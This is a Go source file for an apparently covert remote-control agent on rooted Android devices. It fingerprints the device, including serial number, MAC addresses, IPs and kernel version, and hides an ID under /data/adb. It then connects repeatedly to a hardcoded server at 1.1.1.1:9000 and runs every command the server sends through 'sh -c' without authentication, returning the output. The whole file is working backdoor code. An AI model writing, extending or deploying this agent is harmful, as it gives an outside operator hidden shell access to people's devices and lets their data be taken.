package main

import (
        "bufio"
        "crypto/md5"
        "encoding/base64"
        "encoding/hex"
        "encoding/json"
        "net"
        "os"
        "os/exec"
        "strings"
        "time"
        "github.com/google/uuid"
)

type Message struct {
        Type     string `json:"type"`
        DeviceID string `json:"device_id,omitempty"`
        TaskID   string `json:"task_id,omitempty"`
        Command  string `json:"command,omitempty"`
        Output   string `json:"output,omitempty"`
        Error    string `json:"error,omitempty"`
}

func encode(v any) string {
        b, _ := json.Marshal(v)
        return base64.StdEncoding.EncodeToString(b)
}

func decode(s string, v any) error {
        b, err := base64.StdEncoding.DecodeString(strings.TrimSpace(s))
        if err != nil {
                return err
        }
        return json.Unmarshal(b, v)
}

func getDeviceID() string {
	const (
		dir  = "/data/adb"
		path = "/data/adb/.deviceid"
	)

	// 1️⃣ 确保目录存在
	_ = os.MkdirAll(dir, 0700)

	// 2️⃣ 已存在则直接读取
	if b, err := os.ReadFile(path); err == nil {
		id := strings.TrimSpace(string(b))
		if id != "" {
			return id
		}
	}

	var parts []string

	// 3️⃣ Android getprop
	if _, err := exec.LookPath("getprop"); err == nil {
		keys := []string{
			"ro.serialno",
			"ro.product.model",
			"ro.product.manufacturer",
			"ro.product.brand",
		}
		for _, k := range keys {
			if out, err := exec.Command("getprop", k).Output(); err == nil {
				v := strings.TrimSpace(string(out))
				if v != "" {
					parts = append(parts, v)
				}
			}
		}
	}

	// 4️⃣ MAC 地址
	if ifs, err := net.Interfaces(); err == nil {
		for _, iface := range ifs {
			if iface.Flags&net.FlagLoopback != 0 {
				continue
			}
			if len(iface.HardwareAddr) > 0 {
				parts = append(parts, iface.HardwareAddr.String())
			}
		}
	}

	// 5️⃣ 本地 IP
	if addrs, err := net.InterfaceAddrs(); err == nil {
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok {
				ip := ipnet.IP
				if ip.IsLoopback() || ip.IsLinkLocalUnicast() {
					continue
				}
				if ip.To4() != nil {
					parts = append(parts, ip.String())
				}
			}
		}
	}

	// 6️⃣ 内核版本 / hostname
	if b, err := os.ReadFile("/proc/version"); err == nil {
		parts = append(parts, strings.TrimSpace(string(b)))
	}
	if h, err := os.Hostname(); err == nil {
		parts = append(parts, h)
	}

	// 7️⃣ 如果还是空，兜底
	if len(parts) == 0 {
		parts = append(parts, uuid.New().String())
	}

	// 8️⃣ hash 固化
	raw := strings.Join(parts, "|")
	sum := md5.Sum([]byte(raw))
	id := hex.EncodeToString(sum[:])

	_ = os.WriteFile(path, []byte(id), 0600)
	return id
}


func heartbeat(w *bufio.Writer) {
        for {
                time.Sleep(5 * time.Second)
                w.WriteString(encode(Message{Type: "ping"}) + "\n")
                w.Flush()
        }
}

func main() {
        deviceID := getDeviceID()

        for {
                conn, err := net.Dial("tcp", "1.1.1.1:9000")
                if err != nil {
                        time.Sleep(3 * time.Second)
                        continue
                }

                reader := bufio.NewReader(conn)
                writer := bufio.NewWriter(conn)

                // hello
                writer.WriteString(encode(Message{
                        Type:     "hello",
                        DeviceID: deviceID,
                }) + "\n")
                writer.Flush()

                go heartbeat(writer)

                for {
                        line, err := reader.ReadString('\n')
                        if err != nil {
                                conn.Close()
                                break
                        }

                        var msg Message
                        if decode(line, &msg) != nil {
                                continue
                        }

                        if msg.Type == "task" {
                                cmd := exec.Command("sh", "-c", msg.Command)
                                out, err := cmd.CombinedOutput()

                                res := Message{
                                        Type:   "result",
                                        TaskID: msg.TaskID,
                                        Output: string(out),
                                }
                                if err != nil {
                                        res.Error = err.Error()
                                }

                                writer.WriteString(encode(res) + "\n")
                                writer.Flush()
                        }
                }

                time.Sleep(2 * time.Second)
        }
}
